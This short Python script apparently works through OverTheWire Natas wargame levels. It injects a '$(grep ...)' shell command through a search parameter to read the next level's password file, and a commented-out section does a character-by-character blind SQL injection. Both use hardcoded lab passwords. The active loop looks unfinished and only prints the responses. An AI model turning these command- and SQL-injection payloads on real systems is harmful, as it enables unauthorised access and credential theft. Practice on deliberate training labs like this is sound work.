import requests,string
from requests.auth import HTTPBasicAuth

uri = 'http://natas16.natas.labs.overthewire.org/index.php'
# chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
chars = ''.join([string.ascii_letters,string.digits])
filtered = ''
passwd = ''

for char in chars:
    # Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post(
            uri + '?needle=$(grep -O' + char + ' /etc/natas_webpass/natas17)&submit=Search',
            auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
    print(r.text)
    # if 'exists' in r.text:
    #     filtered = filtered + char
    #     print(filtered)

# for i in range(0,32):
#     for char in filtered:
#         Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
#         r = requests.post(
#             'http://natas15.natas.labs.overthewire.org/index.php?debug',
#             auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
#             data = Data)
#         if 'exists' in r.text:
#             passwd = passwd + char
#             print(passwd)
#             break